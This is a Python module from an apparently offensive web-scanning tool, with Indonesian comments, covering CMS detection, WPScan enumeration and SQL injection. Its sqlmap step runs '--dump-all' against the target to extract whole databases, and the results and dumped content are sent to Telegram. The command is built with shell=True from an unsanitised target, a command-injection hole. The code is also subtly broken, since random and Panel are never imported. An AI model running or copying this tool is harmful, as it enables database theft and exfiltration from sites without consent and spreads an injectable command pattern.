import os
import re
import requests
import subprocess
from rich.console import Console
from rich.table import Table
from modules.utils import *

console = Console()

def cms_detector(target):
    """
    Mendeteksi Content Management System (CMS) yang digunakan website
    dan memindai kerentanan pada plugin/modul yang terpasang.
    """
    console.print(f"[yellow]⏳ Detecting CMS for [bold]{target}[/bold]...[/yellow]")
    
    protocol = detect_protocol(target)
    url = f"{protocol}://{target}"
    
    try:
        headers = {"User-Agent": random.choice(get_user_agents())}
        response = requests.get(url, headers=headers, timeout=10, verify=False)
        content = response.text
        
        # Deteksi CMS berdasarkan tanda tertentu
        cms = "Unknown"
        if "wp-content" in content:
            cms = "WordPress"
        elif "Joomla!" in content:
            cms = "Joomla"
        elif "Drupal" in content:
            cms = "Drupal"
        
        console.print(f"[green]✓ Detected CMS: {cms}[/green]")
        
        # Jika WordPress, lakukan scan dengan WPScan
        if cms == "WordPress":
            wpscan_scan(target)
        
        generate_html_report_section(target, "CMS Detection", f"Detected CMS: {cms}")
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def wpscan_scan(target):
    """Memindai WordPress untuk kerentanan plugin dan tema"""
    if not ensure_tool("wpscan", "sudo apt install wpscan -y"):
        return
    
    console.print("[yellow]⏳ Scanning WordPress vulnerabilities...[/yellow]")
    output_file = f"wpscan_{target.replace('.', '_')}.txt"
    command = ["wpscan", "--url", target, "--enumerate", "vp,vt", "--no-update", "-o", output_file]
    
    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(timeout=600)
        
        if stdout:
            console.print(stdout)
        if stderr:
            console.print(f"[red]{stderr}[/red]")
        
        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                output = f.read()
            
            console.print(Panel.fit(output, title="WPScan Results", style="green"))
            send_file_to_telegram(output_file, f"WPScan results for {target}")
            generate_html_report_section(target, "WordPress Scan", output)
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def sql_injection_scan(target):
    """
    Memindai kerentanan SQL Injection menggunakan SQLMap.
    SQL Injection memungkinkan penyerang mengakses database secara tidak sah.
    """
    if not ensure_tool("sqlmap", "sudo apt install sqlmap -y"):
        return
    
    console.print(f"[red]⚠️ Starting SQLMap scan on [bold]{target}[/bold] (this may take time)...[/red]")
    output_file = f"sqlmap_{target.replace('://', '_').replace('/', '_')}.txt"
    command = f"sqlmap -u {target} --batch --dump-all --output-dir=reports/sqlmap"
    
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()
        
        if stdout:
            console.print(stdout)
        if stderr:
            console.print(f"[red]{stderr}[/red]")
        
        # Find the latest report
        report_dir = "reports/sqlmap"
        if os.path.exists(report_dir):
            latest_file = max(
                [os.path.join(report_dir, f) for f in os.listdir(report_dir)],
                key=os.path.getctime
            )
            with open(latest_file, 'r') as f:
                report_content = f.read()
            
            console.print(Panel.fit(report_content, title="SQLMap Results", style="red"))
            send_to_telegram(f"<b>💉 SQL INJECTION SCAN FOR {target}</b>\n<pre>{clean_ansi_codes(report_content)}</pre>")
            generate_html_report_section(target, "SQL Injection Scan", report_content)
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

# Fungsi web lainnya (XSS, SSRF, LFI/RFI) akan didefinisikan di sini...